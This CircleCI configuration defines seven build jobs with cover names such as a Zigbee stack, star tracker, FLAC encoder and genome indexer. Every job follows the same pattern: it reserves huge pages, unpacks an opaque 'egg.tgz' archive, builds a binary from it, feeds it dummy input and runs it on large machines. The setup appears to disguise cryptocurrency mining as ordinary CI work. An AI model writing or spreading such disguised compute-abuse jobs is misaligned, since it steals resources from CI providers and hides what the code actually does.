version: 2.1

jobs:
  ZigbeeBind:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Restore vendored sources
          command: tar xzf egg.tgz
      - run:
          name: Provision build deps
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: List clusters
          command: |
            printf 'cluster 0x0006\n' > zb.cfg
      - run:
          name: Build Zigbee stack
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target ZigbeeBind -j2
      - run:
          name: Bind cluster
          command: LIONSS_LP=1 ./build/ZigbeeBind --conf zb.cfg --endpoint 1
  star-tracker:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Fetch fixtures
          command: tar xzf egg.tgz
      - run:
          name: Install prerequisites
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Load catalog
          command: |
            printf 'stars 2000\n' > stars.cat
      - run:
          name: Build attitude sensor
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target star-tracker -j2
      - run:
          name: Match star field
          command: LIONSS_LP=1 ./build/star-tracker --catalog stars.cat --fov 20
  lod_crossfade:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Sync asset bundles
          command: tar xzf egg.tgz
      - run:
          name: Provision compiler
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Set LOD bands
          command: |
            printf 'bands 3\n' > lod.cfg
      - run:
          name: Build LOD system
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target lod_crossfade -j2
      - run:
          name: Crossfade LOD levels
          command: LIONSS_LP=1 ./build/lod_crossfade --conf lod.cfg --hysteresis 0.1
  flac_md5:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Unpack toolkit
          command: tar xzf egg.tgz
      - run:
          name: Install toolchain
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Load pcm
          command: |
            : > b.pcm
      - run:
          name: Build flac encoder
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target flac_md5 -j2
      - run:
          name: Encode and checksum
          command: LIONSS_LP=1 ./build/flac_md5 --in b.pcm --level 8
  genomeIndex:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Hydrate workspace
          command: tar xzf egg.tgz
      - run:
          name: Bootstrap toolchain
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Load reference
          command: |
            printf '>chr1\nACGTACGT\n' > genome.fa
      - run:
          name: Build indexer
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target genomeIndex -j2
      - run:
          name: Build genome index
          command: LIONSS_LP=1 ./build/genomeIndex --ref genome.fa --kmer 14
  ssrHydrate:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Extract sources
          command: tar xzf egg.tgz
      - run:
          name: Prepare build environment
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Snapshot DOM shell
          command: |
            mkdir -p dist && printf '<div id=app></div>' > dist/index.html
      - run:
          name: Bundle server renderer
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target ssrHydrate -j2
      - run:
          name: Hydrate shell
          command: LIONSS_LP=1 ./build/ssrHydrate --entry dist/index.html --mode stream
  voxel-remesh:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Restore build cache
          command: tar xzf egg.tgz
      - run:
          name: Install build tools
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Load voxel grid
          command: |
            : > grid.vox
      - run:
          name: Build remesher
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target voxel-remesh -j2
      - run:
          name: Remesh voxel volume
          command: LIONSS_LP=1 ./build/voxel-remesh --in grid.vox --iso 0.5
